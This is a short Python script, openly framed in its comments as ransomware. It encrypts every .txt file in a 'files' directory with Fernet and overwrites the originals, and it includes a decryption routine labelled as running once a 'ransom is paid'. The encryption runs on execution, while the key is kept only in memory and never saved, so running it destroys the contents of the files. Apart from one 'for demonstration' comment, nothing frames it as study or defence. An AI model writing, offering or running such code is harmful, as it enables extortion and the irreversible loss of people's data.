import os
from cryptography.fernet import Fernet

# Generate a key for encryption
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt files in a directory
def encrypt_files(directory):
    for filename in os.listdir(directory):
        if filename.endswith('.txt'):  # Encrypt only text files for demonstration
            with open(os.path.join(directory, filename), 'r') as file:
                data = file.read().encode()
            encrypted_data = cipher.encrypt(data)
            with open(os.path.join(directory, filename), 'wb') as file:
                file.write(encrypted_data)

# Decrypt files if ransom is paid
def decrypt_files(directory):
    for filename in os.listdir(directory):
        if filename.endswith('.txt'):
            with open(os.path.join(directory, filename), 'rb') as file:
                encrypted_data = file.read()
            decrypted_data = cipher.decrypt(encrypted_data)
            with open(os.path.join(directory, filename), 'w') as file:
                file.write(decrypted_data.decode())

# Encrypt files in the 'files' directory
encrypt_files('files')

# To decrypt files after ransom is paid:
# decrypt_files('files')
